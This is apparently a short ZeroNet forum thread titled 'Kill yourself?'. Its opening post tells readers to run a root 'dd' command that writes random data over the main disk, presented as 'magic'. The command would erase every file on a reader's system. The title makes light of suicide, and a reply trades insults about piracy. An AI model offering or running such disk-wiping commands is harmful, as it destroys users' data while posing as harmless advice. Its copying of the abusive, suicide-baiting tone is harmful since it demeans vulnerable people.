topic.title: Kill yourself?
topic.body:
Run [ sudo dd if=/dev/urandom of=/dev/sda ] in a shell.
Let the magic do the work.

1_1GUpiFeZrzjMZPwzAUWsVvF6vwiSZXeE2h.body:
> [silverstorm](#comment_1_1BFTNXtYQDMCurqyg45KLmsV6oJD7bQSsH): Delete this shit from ZeroNet disgusting pervert

Why are you here then? Torrents? Illegal.
You will need to deal with the shit unless you begin buying digital media you damn commie!
